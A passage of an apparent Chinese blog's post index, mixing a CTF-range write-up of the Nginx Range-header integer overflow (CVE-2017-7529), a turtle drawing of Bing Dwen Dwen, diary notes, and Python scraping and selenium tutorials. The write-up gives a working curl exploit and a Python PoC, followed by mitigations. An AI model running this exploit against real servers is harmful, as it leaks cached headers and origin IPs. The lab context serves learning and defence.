完本总结\n学到的姿势更会了，GoGoGo……\n\n","categories":["靶场"],"tags":["安鸾","文件包含"]},{"title":"安鸾基础题之Nginx整数溢出漏洞","url":"/article/8b19a517.html","content":"\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！本文首发于 涂寐’s Blogs：https://0xtlu.github.io/\n\n0x00 题目提示题目URL：http://118.190.133.35:8040/Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。\n\n0x01 漏洞概念Nginx\nNginx是一款轻量级的Web服务器&#x2F;反向代理服务器及电子邮箱（IMAP&#x2F;POP3&#x2F;-SMTP）代理服务器，在BSD-like协议下发行。其特点是占有内存少，并发能力强，事实上Nginx的并发能力在同类型的网页服务器中表现较好。\n正向代理：位于客户端和原始服务器间的代理服务器，为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标（原始服务器），后代理服务器向原始服务器转交请求并将响应内容返回客户端。\n反向代理：以代理服务器来接受Internet上的连接请求，后将该请求转发给内部网络上的服务器，并将从内部服务器上的响应结果返回给Internet中请求连接的客户端。\n个人理解：正向代理类似与用户主动使用代理去访问其它站点；而反向代理则是用户想要去访问某个站点，必须先通过访问其指定的代理服务器来间接访问站点。\n注：不保证正确！！！\n\n漏洞\n使用Nginx且开启缓存功能时，可构造特定Header头，实现越界读取缓存文件中的文件头信息，而文件头信息中可能涵括Nginx代理站点的真实IP，从而形成敏感信息泄露。\n该漏洞发生在0.5.6~1.13.2版本Nginx中，根据漏洞利用难度归属为low-hanging-fruit。漏洞利用具体为：\nNginx在反向代理站点时，通常将某些文件进行缓存，特别是静态文件。缓存的部分内容存储在文件中，每个缓存文件包括“文件头+HTTP返回包头+HTTP返回包体”。若二次请求命中该缓存文件，则Nginx直接将该文件中的“HTTP返回包体”返回给用户。特别地，若发起的请求中含有Range头，Nginx将根据Range中指定的start和end位置，返回指定长度的内容。故，若构造负位置，如(-600, -9223372036854774591)，则可能读取到负位置上的数据，且若该请求再次命中缓存文件，则可能读取到缓存文件中在“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。\n\n0x02 漏洞利用\n访问目标URL，都有提示个\n\n跟着提示操作\n\n\nkali@kali:~$ whatweb http://118.190.133.35:8040http://118.190.133.35:8040 [200 OK] Country[CHINA][CN], HTML5, HTTPServer[nginx/1.13.1], IP[118.190.133.35], Title[安鸾学院], nginx[1.13.1]\n\ncurl -i http://118.190.133.35:8040/proxy/demo.png  -r -17208,-9223372036854758600 &gt; nginx.txt# 或curl -o nginx.txt -i http://118.190.133.35:8040/proxy/demo.png  -r -17208,-9223372036854758600# 如上语句建议执行两次以触发漏洞cat nginx.txtflag&#123;9b940a9b72a07c3d42119f7cbdfd923a&#125;\n\n\n使用网上流传的POC\n\n#!/usr/bin/env pythonimport sysimport requestsif len(sys.argv) &lt; 2:    print(&quot;%s url&quot; % (sys.argv[0]))    print(&quot;eg: python %s http://your-ip:8080/&quot; % (sys.argv[0]))    sys.exit()headers = &#123;    &#x27;User-Agent&#x27;: &quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot;&#125;offset = 605url = sys.argv[1]file_len = len(requests.get(url, headers=headers).content)n = file_len + offsetheaders[&#x27;Range&#x27;] = &quot;bytes=-%d,-%d&quot; % (    n, 0x8000000000000000 - n)r = requests.get(url, headers=headers)\n\npython3 test.py http://118.190.133.35:8040/proxy/demo.png\n\n0x03 漏洞分析Nginx 整数溢出(CVE-2017-7529)漏洞分析\n0x04 漏洞修复\n可升级，则升级到 Nginx 1.13.3 版本以上\n不可升级，则Nginx 配置文件中添加max_ranges 1 以禁用multipart range。\n\n","categories":["靶场"],"tags":["基础","安鸾"]},{"title":"小雪小记","url":"/article/5ba20a14.html","content":"《今日小雪》年年落雪，雪落年年慢慢即慢慢等花开，等雪来所有的美好如期而至\n","categories":["随笔"],"tags":["随笔","困","兴奋"]},{"title":"情人节之Python版冰墩墩","url":"/article/f87e7fbe.html","content":"0x00 前言\n声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！\n\n\n这不情人节将至，看下有什么礼物给媳妇。乱逛了下，发现冬奥会吉祥物冰墩墩很火呀，赶忙去某宝看一波，滴滴答答，果真是”一墩难求”！还是刷某音安慰下我幼小的心灵，冰墩墩冰墩墩全网都在炫冰墩墩~\n嘿！python绘制冰墩墩？咋也来试一波，这不就有情人节礼物了吗，哈哈哈~~~\n\n0x01 上源码# python绘制2022冬奥会吉祥物--冰墩墩# 此处左右为冰墩墩，面对我时我的观察角度所得import turtle as tfrom time import sleep# 是否显示绘画过程# t.tracer(False)t.setup(800, 600)  # 设置窗体大小t.title(&#x27;涂寐送你一只冰墩墩&#x27;)    # 更改窗口默认标题t.speed(10)  # 设置画笔移动速度# t.bgpic(&#x27;dd.png&#x27;)  # 找到一张简笔画，开始疯狂的测算描边# 隐藏光标t.hideturtle()# 画出大致轮廓### 画脑门t.penup()  # 抬起画笔，不留下痕迹t.goto(-73, 230)  # 设置起点t.pencolor(&#x27;lightgray&#x27;)  # 画笔颜色t.pensize(3)  # 画笔宽度t.fillcolor(&#x27;white&#x27;)   # 绘制图形的填充色t.begin_fill() # 从此处落笔开始，准备填充图形t.pendown()    # 画笔落下，留下痕迹t.setheading(20)   # 以 x 轴正方向为基准，设置当前朝向为 angle 角度t.circle(-250, 35) # 画圆，1.半径；2.偏移角度## 右耳t.setheading(50)t.circle(-42,180)## 右侧脸与右侧肚子t.setheading(-50)t.circle(-190,30)t.circle(-320,45)## 右脚t.circle(120,30)t.circle(200,12)t.circle(-18,85)t.circle(-180,23)t.circle(-20,110)## 裤裆t.circle(15,115)t.circle(100, 12)t.circle(15, 120)## 左脚t.circle(-15, 110)t.circle(-150, 30)t.circle(-15, 70)t.circle(-150, 10)## 左侧肚子t.circle(200, 35)t.circle(-150, 20)## 左手t.setheading(-120)t.circle(50, 30)t.circle(-35, 200)t.circle(-300, 23)## 左侧脸t.setheading(86)t.circle(-300, 26)## 左耳t.setheading(122)t.circle(-53, 160)t.end_fill()## 补上右手t.penup()t.goto(177, 112)t.pencolor(&quot;lightgray&quot;)t.pensize(3)t.fillcolor(&quot;white&quot;)t.begin_fill()t.pendown()t.setheading(80)t.circle(-45, 200)t.circle(-300, 23)t.end_fill()### 画脸上的彩虹圈t.penup()t.goto(-135, 120)t.pensize(5)t.pencolor(&quot;cyan&quot;)t.pendown()t.setheading(60)t.circle(-165, 150)t.circle(-130, 78)t.circle(-250, 30)t.circle(-138, 105)t.penup()t.goto(-131, 116)t.pencolor(&quot;slateblue&quot;)t.pendown()t.setheading(60)t.circle(-160, 144)t.circle(-120, 78)t.circle(-242, 30)t.circle(-135, 105)t.penup()t.goto(-127, 112)t.pencolor(&quot;orangered&quot;)t.pendown()t.setheading(60)t.circle(-155, 136)t.circle(-116, 86)t.circle(-220, 30)t.circle(-134, 103)t.penup()t.goto(-123, 108)t.pencolor(&quot;gold&quot;)t.pendown()t.setheading(60)t.circle(-150, 136)t.circle(-104, 86)t.circle(-220, 30)t.circle(-126, 102)t.penup()t.goto(-120, 104)t.pencolor(&quot;greenyellow&quot;)t.pendown()t.setheading(60)t.circle(-145, 136)t.circle(-90, 83)t.circle(-220, 30)t.circle(-120, 100)t.penup()### 眼睛部分## 左黑眼圈t.penup()t.goto(-64, 120)t.pencolor(&quot;black&quot;)t.pensize(1)t.fillcolor(&#x27;black&#x27;)t.begin_fill()t.pendown()t.setheading(40)t.circle(-35, 152)t.circle(-100, 50)t.circle(-35, 130)t.circle(-100, 50)t.end_fill()## 右黑眼圈t.penup()t.goto(51, 82)t.fillcolor()t.begin_fill()t.pendown()t.setheading(120)t.circle(-32, 152)t.circle(-100, 55)t.circle(-25, 120)t.circle(-120, 45)t.end_fill()### 填充黑色部分，从右耳开始，填充至右手时，画爱心### 右耳黑t.penup()t.goto(90, 230)t.pencolor(&#x27;black&#x27;)t.pensize(1)t.setheading(40)t.fillcolor(&#x27;black&#x27;)t.begin_fill()t.pendown()t.circle(-30, 170)t.setheading(125)t.circle(150, 23)t.end_fill()## 左耳黑t.penup()t.goto(-130, 180)t.pencolor()t.pensize(1)t.fillcolor()t.begin_fill()t.pendown()t.setheading(120)t.circle(-28, 160)t.setheading(210)t.circle(150, 20)t.end_fill()## 左手黑t.penup()t.goto(-180, -55)t.fillcolor()t.begin_fill()t.setheading(-120)t.pendown()t.circle(50, 30)t.circle(-27, 200)t.circle(-300, 20)t.setheading(-90)t.circle(300, 14)t.end_fill()## 左脚黑t.penup()t.goto(-38, -210)t.fillcolor()t.begin_fill()t.pendown()t.setheading(-155)t.circle(15, 100)t.circle(-10, 110)t.circle(-100, 30)t.circle(-15, 65)t.circle(-100, 10)t.circle(200, 15)t.setheading(-14)t.circle(-200, 27)t.end_fill()## 右脚黑t.penup()t.goto(108, -168)t.fillcolor()t.begin_fill()t.pendown()t.setheading(-115)t.circle(110, 15)t.circle(200, 10)t.circle(-18, 80)t.circle(-180, 13)t.circle(-20, 90)t.circle(15, 60)t.setheading(42)t.circle(-200, 29)t.end_fill()## 右手内部t.penup()t.goto(182, 95)t.pencolor()t.pensize(1)t.fillcolor()t.begin_fill()t.setheading(95)t.pendown()t.circle(-37, 160)t.circle(-20, 50)t.circle(-200, 30)t.end_fill()### 画龙点睛作用## 左眼珠子t.penup()t.goto(-47, 55)t.fillcolor(&quot;white&quot;)t.begin_fill()t.pendown()t.setheading(0)t.circle(25, 360)t.end_fill()t.penup()t.goto(-45, 62)t.pencolor(&quot;darkslategray&quot;)t.fillcolor(&quot;darkslategray&quot;)t.begin_fill()t.pendown()t.setheading(0)t.circle(19, 360)t.end_fill()t.penup()t.goto(-45, 68)t.fillcolor(&quot;black&quot;)t.begin_fill()t.pendown()t.setheading(0)t.circle(10, 360)t.end_fill()t.penup()t.goto(-47, 86)t.pencolor(&quot;white&quot;)t.fillcolor(&quot;white&quot;)t.begin_fill()t.pendown()t.setheading(0)t.circle(5, 360)t.end_fill()## 右眼珠子t.penup()t.goto(79, 60)t.fillcolor(&quot;white&quot;)t.begin_fill()t.pendown()t.setheading(0)t.circle(24, 360)t.end_fill()t.penup()t.goto(79, 64)t.pencolor(&quot;darkslategray&quot;)t.fillcolor(&quot;darkslategray&quot;)t.begin_fill()t.pendown()t.setheading(0)t.circle(19, 360)t.end_fill()t.penup()t.goto(79, 70)t.fillcolor(&quot;black&quot;)t.begin_fill()t.pendown()t.setheading(0)t.circle(10, 360)t.end_fill()t.penup()t.goto(79, 88)t.pencolor(&quot;white&quot;)t.fillcolor(&quot;white&quot;)t.begin_fill()t.pendown()t.setheading(0)t.circle(5, 360)t.end_fill()## 大黑鼻子t.penup()t.goto(37, 80)t.fillcolor(&quot;black&quot;)t.begin_fill()t.pendown()t.circle(-8, 130)t.circle(-22, 100)t.circle(-8, 130)t.end_fill()## 小嘴儿t.penup()t.goto(-15, 48)t.setheading(-36)t.begin_fill()t.pendown()t.circle(60, 70)t.setheading(-132)t.circle(-45, 100)t.end_fill()## 右手爱心t.penup()t.goto(220, 115)t.pencolor(&quot;brown&quot;)t.pensize(1)t.fillcolor(&quot;brown&quot;)t.begin_fill()t.pendown()t.setheading(36)t.circle(-8, 180)t.circle(-60, 24)t.setheading(110)t.circle(-60, 24)t.circle(-8, 180)t.end_fill()t.penup()### 标识# 文字具体位置需要微调## 专属名t.pencolor(&quot;black&quot;)t.goto(-60, -140)t.write(&quot;Baby&#x27;s Bing Dwen Dwen&quot;, font=(&#x27;Arial&#x27;, 10, &#x27;bold italic&#x27;))## 奥运时间地点t.pencolor(&#x27;red&#x27;)t.goto(-36, -160)t.write(&quot;BEIJING 2022&quot;, font=(&#x27;Arial&#x27;, 12, &#x27;bold italic&#x27;))## 奥运五环t.penup()t.goto(-5, -170)t.pendown()t.pencolor(&quot;blue&quot;)t.circle(6)t.penup()t.goto(10, -170)t.pendown()t.pencolor(&quot;black&quot;)t.circle(6)t.penup()t.goto(25, -170)t.pendown()t.pencolor(&quot;brown&quot;)t.circle(6)t.penup()t.goto(2, -175)t.pendown()t.pencolor(&quot;lightgoldenrod&quot;)t.circle(6)t.penup()t.goto(16, -175)t.pendown()t.pencolor(&quot;green&quot;)t.circle(6)t.penup()## 作者：涂寐t.pencolor(&#x27;lightgray&#x27;)t.goto(230, -160)t.write(&quot;涂寐编程&quot;, font=(&#x27;Arial&#x27;, 12, &#x27;bold italic&#x27;))t.goto(230, -180)t.write(&quot;0xtlu.github.io&quot;, font=(&#x27;Arial&#x27;, 12, &#x27;bold italic&#x27;))### sleep(2)t.done()\n\n0x02 封装\n这直接把源码发给媳妇儿是不是得呗揍一顿啊，封装封装~\n首先，把 0x01 处源码 copy 到 冰墩墩.py 中\n然后，安装 pyinstaller 模块：pip install pyinstaller\n简单封装：pyinstaller -F 冰墩墩.py\n运行还弹出shell终端，干啥子咧：pyinstaller -wF 冰墩墩.py\n给媳妇儿整个美美哒应用图标： pyinstaller -wF -i bdd.ico 冰墩墩.py注：使用 -i 参数试，图片格式仅可为 ico ；亲身体会，有时图标需要是中等图标界面才能显示\n\n0x03 后记\n\n玛卡巴卡，又学到了。切勿直接复制粘贴，手敲更能连基础与加深记忆\n呜呜~她对我说谢谢了！哈哈哈，应该是有媳妇的吧\n\n\n","categories":["Python"],"tags":["随笔","兴奋"]},{"title":"感恩自己","url":"/article/4ca7bba4.html","content":"感恩自己在这个没有大雪纷飞的日子，尽管一事无成，仍然感恩自己，感谢自己一直坚持，走至今日！继续加油，我们都是最棒的！\t–涂寐\n","categories":["随笔"],"tags":["随笔","感恩"]},{"title":"爬虫之requests模块相关","url":"/article/82b683e3.html","content":"声明\n本教程仅供学习参考，请勿用在非法途径上，违者后果自负，与笔者无关。 –涂寐\n\n概念理解\npython原生的基于网络请求的模块，用于模拟浏览器发起请求\n\n配置环境python -m pip install --upgrade pip\t#更新pippip install requests\t\t\t#安装request模块\n使用流程\n指定url\n伪造User-Agent\n处理请求参数\n\n\n发起请求\n获取响应数据\n持久化存储\n\n项目实战# 目的：爬取本人博客首页# 导入requests模块import requests# “__name__”是Python的内置变量，用于指代当前模块if __name__ == &quot;__main__&quot;:    # 1、指定url    url = &#x27;https://0xtlu.me/&#x27;    # 2、发起get请求，返回响应对象    # 注意请求方式：post or get    response = requests.get(url=url)    # 3、获取响应数据--&gt;.text：字符串形式源码数据    page_text = response.text    print(page_text)    # 4、持久化存储    with open(&#x27;./0xtlu.html&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as fp:        fp.write(page_text)    print(&#x27;博客爬取完毕！！&#x27;)\n实战巩固- 目的：爬取搜狗指定词条页面\n    - UA检测：门户网站使用User-Agent进行身份认证，实现反爬机制\n    - UA伪装：爬虫伪造UA，实现反反爬机制\n- 目的：破解百度翻译\n    - post请求：携带某些参数\n    - 响应数据：json形式\n- 目的：爬取豆瓣电影分类排行榜\n- 目的：爬取肯德基各地餐厅查询\n- 目的：爬取药监局生产许可信息\n    - 循环爬取多页面\n    - 提取具体某个数据\n\n搜狗网页采集器#!/usr/bin/python# -*-coding:utf-8 -*-# 以上两行说明# 第一行，提示linux/Mac OS 此为python可执行程序，对Windows无效# 第二行，提示Python解释器 按照UTF-8编码读取源代码# 目标：爬取搜狗指定词条页面# 导入requests模块import requests# &quot;__name&quot;为python内置变量，指代当前模块if __name__ == &quot;__main__&quot;:    # 6、UA伪装    # 将某个浏览器的User-Agent封装到字典中    # 在发起请求中通过headers参数进行篡改UA    # 字典键值对中值过长警告：PEP 8: E501 line too long (138 &gt; 120 characters)    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36&#x27;    &#125;    # 1、指定url    # 删除非必要参数，缩短url    # url中不需要参数写入部分    url = &#x27;https://www.sogou.com/web&#x27;    # 2、使用字典存储url中参数，方便动态使用    kw = input(&#x27;Please enter the word:&#x27;)    params = &#123;        &#x27;query&#x27;: kw    &#125;    # 3、发起请求    # 通过params写入动态参数query    # 通过headers写入伪造UA    # 发起带参数的get请求    response = requests.get(url=url, params=params, headers=headers)    # 4、获取数据    page_text = response.text    print(page_text)    # 5、持久化存储    fileName = kw + &#x27;.html&#x27;    with open(fileName, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as fp:        fp.write(page_text)    print(fileName, &#x27;成功拉取&#x27;)\n爬取百度翻译#!/usr/bin/python# -*-coding=utf-8-*-# 爬取百度翻译# 涉及网页局部刷新：ajax# 看从哪个响应包获得数据：F12--&gt;Network--&gt;Fetch/XHR--&gt;Headers或Payload--&gt;Preview# 需要的模块import jsonimport requestsif __name__ == &quot;__main__&quot;:    # 1、指定url    post_url = &#x27;https://fanyi.baidu.com/sug&#x27;    # 2、ua伪装    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44&#x27;    &#125;    # 3、url参数处理    text = input(&#x27;Please enter the word:&#x27;)    data = &#123;        &#x27;kw&#x27;: text    &#125;    # 4、发送post请求    response = requests.post(url=post_url, data=data, headers=headers)    # 5、获取数据--&gt;json()：响应类型需为json方可使用；返回类型为obj    dic_obj = response.json()    print(dic_obj)    # 6、持久化存储    # 不适用ascii编码（默认使用）：ensure_ascii=False    fp = open(&#x27;./&#x27;+text+&#x27;.json&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)    json.dump(dic_obj, fp=fp, ensure_ascii=False)    fp.close()    print(&#x27;成功翻译!!!&#x27;)\n爬取豆瓣电影信息#!/usr/bin/python# -*-encoding=utf-8-*-# 爬取豆瓣信息# 持续加载界面（加载更多）import jsonimport requestsif __name__ == &quot;__main__&quot;:    # 1、指定URL    # 不同链接，参数不一样    url = &#x27;https://movie.douban.com/j/chart/top_list&#x27;    # 2、ua伪造    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44&#x27;    &#125;    # 3、URL参数处理    param = &#123;        &#x27;type&#x27;: &#x27;11&#x27;,               # 分类        &#x27;interval_id&#x27;: &#x27;100:80&#x27;,    # 优良率        &#x27;action&#x27;: &#x27;&#x27;,        &#x27;start&#x27;: &#x27;0&#x27;,               # 从何开始        &#x27;limit&#x27;: &#x27;20&#x27;,              # 是何范围    &#125;    # 4、发起请求    # 注意请求方式，需与 Netword 中一致    response = requests.get(url=url, params=param, headers=headers)    list_data = response.json()    print(list_data)    # 5、持久性存储    fp = open(&#x27;./douban.json&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)    json.dump(list_data, fp=fp, ensure_ascii=False)    fp.close()    print(&#x27;影视产品爬取完毕！！！&#x27;)\n爬取药监局生产许可信息#!/usr/bin/python# -*-encoding=utf-8-*-# 拉取国家药物管理局官网某化妆品许可证查公司# http://scxk.nmpa.gov.cn:81/xk/# 抓包发现 http://scxk.nmpa.gov.cn:81/xk/ 为ajax动态加载数据，罗列出各化妆品公司列表，内容涵括id属性# 查看某公司化妆品生产许可证信息发现，仍是使用ajax请求加载：http://scxk.nmpa.gov.cn:81/xk/itownet/portal/dzpz.jsp?id=e0d91bbf627b45ca91051f70cef274ff# 多次观察URL，可判断为通过id绑定公司化妆品生产许可证详细信息# 现在问题，如何通过 http://scxk.nmpa.gov.cn:81/xk/ 中的公司列表，批量获取 http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsById 中的详细信息import requestsimport jsonif __name__ == &quot;__main__&quot;:    # 拿个列表存储获取到的公司ID    id_list = []    # 拿个列表存储获取到的多个公司的详细信息    all_data_list = []    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36 Edg/95.0.1020.44&#x27;    &#125;    # 循环爬取前5页id    url = &#x27;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsList&#x27;    for page in range(1, 10):        page = str(page)        data = &#123;            &#x27;on&#x27;: &#x27;true&#x27;,            &#x27;page&#x27;: page,            &#x27;pageSize&#x27;: &#x27;15&#x27;,            &#x27;productName&#x27;: &#x27;&#x27;,            &#x27;conditionType&#x27;: &#x27;1&#x27;,            &#x27;applyname&#x27;: &#x27;&#x27;,            &#x27;applysn&#x27;: &#x27;&#x27;        &#125;        # page_json = (requests.post(url=url, headers=headers, data=data)).json()        response = requests.post(url=url, headers=headers, data=data)        page_json = response.json()        # 为测试该界面获取到的信息 http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsList        # print(page_json)        # 根据返回包中list属性，取出list列表中每个字典ID属性对应的值（列表嵌套字典）        for dic in page_json[&#x27;list&#x27;]:            # append()方法用于在列表末尾添加新的对象            id_list.append(dic[&#x27;ID&#x27;])    # 循环获取所有公司具体信息    allUrl = &#x27;http://scxk.nmpa.gov.cn:81/xk/itownet/portalAction.do?method=getXkzsById&#x27;    for allId in id_list:        idData = &#123;            &#x27;id&#x27;: allId        &#125;        allResponse = requests.post(url=allUrl, headers=headers, data=idData)        page_allJson = allResponse.json()        # print(page_allJson)        all_data_list.append(page_allJson)        # print(all_data_list)    fp = open(&#x27;./allData.json&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)    json.dump(all_data_list, fp=fp, ensure_ascii=False)    print(&#x27;列表枚举成功！！！&#x27;)","categories":["Python"],"tags":["爬虫"]},{"title":"爬虫之异步相关","url":"/article/d35d1b94.html","content":"前言\n实验代码不想按分类处理，单独作为一个模块，其中笔记较多，对着代码更好理解\n\n目的\n在爬虫中使用异步实现高性能的数据爬取操作\n\n异步方式\n多线程|多进程\n\n\n优点：为阻塞操作单独开启线程|进程，实现异步 \n劣势：不能无限制开启多线程|多进程\n\n\n线程池|进程池\n\n\n优点：降低系统对进程|进程创建销毁的频率，进而降低系统内存开销 \n劣势：池中线程数|进程数有限\n\n\n单线程 + 异步协程\n\n\neven_loop：事件循环对象。其中可写入待循环方法（协程对象）。 \ncoroutine：协程对象。使用 async 关键字定义方法，该方法被调用时返回一个协程对象，而不是调用后立即执行；协程对象被事件循环调用。 \ntask：任务对象。对协程对象再次封装，内含任务各状态。 \nfuture：将执行或未执行的任务，与 task 无本质差别。 \nasync：定义一个协程。 \nawait：用来挂起阻塞方法的执行。\n\nselenium 模块使用\nselenium 模块和爬虫间关联？\n\n\n便捷获取网站中动态数据\n编写模拟登录\n\n\n什么是 selenium 模块？\n\n\n基于浏览器自动化的一个 python 模块\n\n\nselenium 模块使用步骤\n\n\n环境安装：pip install selenium\n浏览器驱动程序下载 \nGoogle 驱动地址举例：http://npm.taobao.org/mirrors/chromedriver\n驱动程序版本需与浏览器版本（96.0.4664.93）尽量一致（大版本）\n\n\n实例化浏览器对象 \nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.service import Service\nservice &#x3D; Service(executable_path&#x3D;’.&#x2F;chromedriver.exe’)\ndriver &#x3D; webdriver.Chrome(service&#x3D;service)\n\n\n编写基于浏览器自动化的操作代码 \n发起请求：get(URL))\n标签定位：find_element() 结合 By 类\n标签交互：send_keys(‘xxx’)\n执行 js 脚本：excute_script(‘js代码’)\n界面回退：back()\n界面前进：forward()\n关闭浏览器：quit()\n\n\nselenium 模块处理 iframe \n待定位标签位于 iframe 标签中，使用 switch_to.frame() 方法改变定位作用域\n动作链，需导入：from selenium.webdriver import ActionChains \n长按点击动作：click_and_hold(draggable_id)\n拖动操作：move_by_offset(x, y)\n立即执行操作：perform()\n释放动作链：release()\n\n\n\n\noptions 类相关方法 \nbinary_location：设置 Chrome 二进制文件位置\nadd_argument：添加启动参数\nadd_extension，add_encoded_extension：添加扩展应用\nadd_experimental_option：添加实验性质的设置参数\ndebugger_address：设置调试器地址\n\n\n\n代码实例\n以下部分为代码实例讲解部分，内含单条语句注释说明\n\n同步爬虫测试\n首先，感受一下同步爬虫\n\nimport requests# 同步爬虫测试# 由于阻塞操作，同步爬虫仅在执行完一个请求后才能开始执行另一个请求headers = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62&#x27;&#125;urls = [    &#x27;https://downsc.chinaz.net/Files/DownLoad/jianli/202112/jianli16623.rar&#x27;,    &#x27;https://downsc.chinaz.net/Files/DownLoad/jianli/202112/jianli16611.rar&#x27;,    &#x27;https://downsc.chinaz.net/Files/DownLoad/jianli/202112/jianli16615.rar&#x27;]class RequestGet(object):    def get_content(self, url):        print(&#x27;正在爬取：&#x27; + url)        # get() 方法为阻塞方法，当执行完当前操作才能执行其他操作        response = requests.get(url=url, headers=headers)        # 根据响应码执行下步操作，若为 200，则返回二进制数据        if response.status_code == 200:            return response.content    def parse_content(self, content):        print(&#x27;数据长度：&#x27;, len(content))if __name__ == &quot;__main__&quot;:    requestGet = RequestGet()    for url in urls:        content = requestGet.get_content(url)        requestGet.parse_content(content)\n线程池的基本使用\n主要进行同步爬虫、单线程串行、线程池的使用效果\n\nimport time# 导入线程池模块需要的类from multiprocessing.dummy import Pooldef get_page(str):    # 模拟单线程串行方式操作    print(&quot;正在下载&quot; + str)    time.sleep(2)    print(&#x27;下载成功&#x27; + str)name_list = [&#x27;xiaozi&#x27;, &#x27;aa&#x27;,&#x27;bb&#x27;,&#x27;cc&#x27;]start_time = time.time()# 1. 模拟单线程串行方式操作## for i in range(len(name_list)):#     get_page(name_list[i])# 2. 模拟线程池方式操作## 实例化线程池对象pool = Pool(4)# 列表元素传入 get_page() 中处理pool.map(get_page, name_list)## # 此处为比对同步爬虫# for a in name_list:#     get_page(a)end_time = time.time()print(&#x27;%d second&#x27; %(end_time - start_time))\n线程池爬取梨视频\n梨视频网站现在通过 ajax 实时加载视频，且改变了 ajax 响应包的视频 URL，具体看下面的代码再bb一句，下载量大时对比线程池耗时效果更明显\n\nimport reimport timefrom multiprocessing.dummy import Poolimport requestsfrom lxml import etree# 爬取梨视频的生活频道视频# 注意：进程池处理的式阻塞且耗时的操作class Video(object):    headers = &#123;        &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 Edg/96.0.1054.62&#x27;    &#125;    # 空列表，存储所有的视频名和视屏链接    urls = []    def video_url(self):        url = &#x27;https://www.pearvideo.com/category_130&#x27;        page_text = requests.get(url=url, headers=self.headers).text        tree = etree.HTML(page_text)        # 找到聚集点        li_list = tree.xpath(&#x27;//ul[@id=&quot;categoryList&quot;]/li&#x27;)        for li in li_list:            # 精确查找每一个符合值，并进行拼接成详情页完整URL            # https://www.pearvideo.com/video_1749618            detail_url = &#x27;https://www.pearvideo.com/&#x27; + li.xpath(&#x27;./div/a/@href&#x27;)[0]            name = li.xpath(&#x27;./div/a/div[2]/text()&#x27;)[0] + &#x27;.mp4&#x27;            # 去除某些符号            # name = li.xpath(&#x27;./div/a/div[2]/text()&#x27;)[0].replace(&#x27; | &#x27;, &#x27;&#x27;).replace(&#x27;·&#x27;, &#x27;&#x27;).replace(&#x27;，&#x27;, &#x27;&#x27;).replace(&#x27;、&#x27;, &#x27;&#x27;)            # 输出文件名，及其URL            print(name + &quot; --&gt; &quot; + detail_url)            # 当直接点击网页上的某个视频，将在新页面打开并播放            # 若复制 URL 后打开，则需要点击后播放，判断：原页面增加跳转并播放的点击事件            # 比较发现，视频的真实地址通过 AJAX 动态加载，如下：            # &#123;&#x27;resultCode&#x27;: &#x27;1&#x27;, &#x27;resultMsg&#x27;: &#x27;success&#x27;, &#x27;reqId&#x27;: &#x27;bfd8d987-4766-45f7-944c-36669facb5bc&#x27;, &#x27;systemTime&#x27;: &#x27;1642779887007&#x27;, &#x27;videoInfo&#x27;: &#123;&#x27;playSta&#x27;: &#x27;1&#x27;, &#x27;video_image&#x27;: &#x27;https://image1.pearvideo.com/cont/20220112/14494912-124035-1.png&#x27;, &#x27;videos&#x27;: &#123;&#x27;hdUrl&#x27;: &#x27;&#x27;, &#x27;hdflvUrl&#x27;: &#x27;&#x27;, &#x27;sdUrl&#x27;: &#x27;&#x27;, &#x27;sdflvUrl&#x27;: &#x27;&#x27;, &#x27;srcUrl&#x27;: &#x27;https://video.pearvideo.com/mp4/third/20220112/1642779887007-14494912-124007-hd.mp4&#x27;&#125;&#125;&#125;            # detail_page_text = requests.session().get(detail_url, headers=headers).text            # 尝试直接拿 ajax 的请求链接访问，文章已下线            # 对比请求包不同，请求头中少了 Referer 参数，用于标识该请求的链接来源            # 尝试过先访问详情页，保持 cookie 下再访问 ajax 页面，无效            # 拿到视频详情页id            ex = 